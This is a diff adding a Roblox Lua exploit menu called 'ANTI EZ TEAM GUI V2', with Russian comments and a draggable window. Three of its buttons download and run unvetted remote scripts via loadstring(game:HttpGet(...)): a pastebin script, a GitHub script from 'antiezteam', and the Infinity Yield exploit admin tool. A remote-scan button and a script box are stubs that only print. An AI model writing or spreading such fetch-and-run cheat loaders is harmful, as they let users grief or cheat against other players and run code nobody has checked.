@@ -1,0 +1,164 @@
+-- ANTI EZ TEAM GUI V2
+local function createGUI()
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+	local playerGui = player:WaitForChild("PlayerGui")
+	local UserInputService = game:GetService("UserInputService")
+
+	local ScreenGui = Instance.new("ScreenGui")
+	ScreenGui.Name = "AntiEzTeamGUI"
+	ScreenGui.Parent = playerGui
+
+	local MainFrame = Instance.new("TextLabel")
+	MainFrame.Name = "MainFrame"
+	MainFrame.Size = UDim2.new(0, 400, 0, 350)
+	MainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
+	MainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+	MainFrame.Text = ""
+	MainFrame.Parent = ScreenGui
+
+	local TitleLabel = Instance.new("TextLabel")
+	TitleLabel.Name = "TitleLabel"
+	TitleLabel.Size = UDim2.new(1, 0, 0, 50)
+	TitleLabel.Position = UDim2.new(0, 0, 0, 0)
+	TitleLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.4)
+	TitleLabel.Text = "ANTIEZTEAM GUI V2"
+	TitleLabel.TextColor3 = Color3.new(1, 1, 1)
+	TitleLabel.TextScaled = true
+	TitleLabel.Parent = MainFrame
+
+	local ScriptBox = Instance.new("TextBox")
+	ScriptBox.Name = "ScriptBox"
+	ScriptBox.Size = UDim2.new(0.9, 0, 0, 100)
+	ScriptBox.Position = UDim2.new(0.05, 0, 0.2, 0)
+	ScriptBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+	ScriptBox.TextColor3 = Color3.new(1, 1, 1)
+	ScriptBox.PlaceholderText = "Enter your script"
+	ScriptBox.Text = ""
+	ScriptBox.TextScaled = true
+	ScriptBox.Parent = MainFrame
+
+	local FEButton = Instance.new("TextButton")
+	FEButton.Name = "FEButton"
+	FEButton.Size = UDim2.new(0.4, 0, 0, 40)
+	FEButton.Position = UDim2.new(0.05, 0, 0.7, 0)
+	FEButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+	FEButton.Text = "FE CADUCUS"
+	FEButton.TextColor3 = Color3.new(1, 1, 1)
+	FEButton.TextScaled = true
+	FEButton.Parent = MainFrame
+
+	local NaturalDisasterButton = Instance.new("TextButton")
+	NaturalDisasterButton.Name = "NaturalDisasterButton"
+	NaturalDisasterButton.Size = UDim2.new(0.4, 0, 0, 40)
+	NaturalDisasterButton.Position = UDim2.new(0.55, 0, 0.7, 0)
+	NaturalDisasterButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.2)
+	NaturalDisasterButton.Text = "natural disaster"
+	NaturalDisasterButton.TextColor3 = Color3.new(1, 1, 1)
+	NaturalDisasterButton.TextScaled = true
+	NaturalDisasterButton.Parent = MainFrame
+
+	local InfinityYieldButton = Instance.new("TextButton")
+	InfinityYieldButton.Name = "InfinityYieldButton"
+	InfinityYieldButton.Size = UDim2.new(0.4, 0, 0, 40)
+	InfinityYieldButton.Position = UDim2.new(0.05, 0, 0.85, 0)
+	InfinityYieldButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.8)
+	InfinityYieldButton.Text = "infinity yield"
+	InfinityYieldButton.TextColor3 = Color3.new(1, 1, 1)
+	InfinityYieldButton.TextScaled = true
+	InfinityYieldButton.Parent = MainFrame
+
+	local ScanButton = Instance.new("TextButton")
+	ScanButton.Name = "ScanButton"
+	ScanButton.Size = UDim2.new(0.4, 0, 0, 40)
+	ScanButton.Position = UDim2.new(0.55, 0, 0.85, 0)
+	ScanButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.8)
+	ScanButton.Text = "SCAN REMOTES"
+	ScanButton.TextColor3 = Color3.new(1, 1, 1)
+	ScanButton.TextScaled = true
+	ScanButton.Parent = MainFrame
+
+	-- УЛУЧШЕННАЯ ФУНКЦИЯ ПЕРЕМЕЩЕНИЯ БЕЗ БАГОВ
+	local function makeDraggable(gui)
+		local dragging = false
+		local dragStart = Vector2.new(0, 0)
+		local startPos = UDim2.new(0, 0, 0, 0)
+		
+		local function update(input)
+			local delta = input.Position - dragStart
+			local newX = startPos.X.Offset + delta.X
+			local newY = startPos.Y.Offset + delta.Y
+			
+			-- Ограничение перемещения в пределах экрана
+			newX = math.max(0, math.min(newX, playerGui.AbsoluteSize.X - gui.AbsoluteSize.X))
+			newY = math.max(0, math.min(newY, playerGui.AbsoluteSize.Y - gui.AbsoluteSize.Y))
+			
+			gui.Position = UDim2.new(0, newX, 0, newY)
+		end
+		
+		local function onInputBegan(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				dragStart = input.Position
+				startPos = gui.Position
+				
+				-- Захват ввода для предотвращения багов
+				if input.UserInputType == Enum.UserInputType.Touch then
+					input:Capture()
+				end
+			end
+		end
+		
+		local function onInputChanged(input)
+			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				update(input)
+			end
+		end
+		
+		local function onInputEnded(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = false
+			end
+		end
+		
+		gui.InputBegan:Connect(onInputBegan)
+		gui.InputChanged:Connect(onInputChanged)
+		gui.InputEnded:Connect(onInputEnded)
+		
+		-- Дополнительная обработка для телефона
+		UserInputService.TouchEnded:Connect(function(input)
+			if dragging then
+				dragging = false
+			end
+		end)
+	end
+
+	makeDraggable(MainFrame)
+	makeDraggable(TitleLabel)
+
+	FEButton.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/XJeBNe0s"))()
+	end)
+
+	NaturalDisasterButton.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/antiezteam/-/refs/heads/main/fwwafwfaf"))()
+	end)
+
+	InfinityYieldButton.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end)
+
+	ScanButton.MouseButton1Click:Connect(function()
+		print("SCAN REMOTES активирован!")
+	end)
+
+	ScriptBox.FocusLost:Connect(function(enterPressed)
+		if enterPressed then
+			print("Выполняем скрипт: " .. ScriptBox.Text)
+		end
+	end)
+
+	print("ANTIEZTEAM GUI V2 загружено! Плавное перемещение на ПК и телефоне")
+end
+
+createGUI()
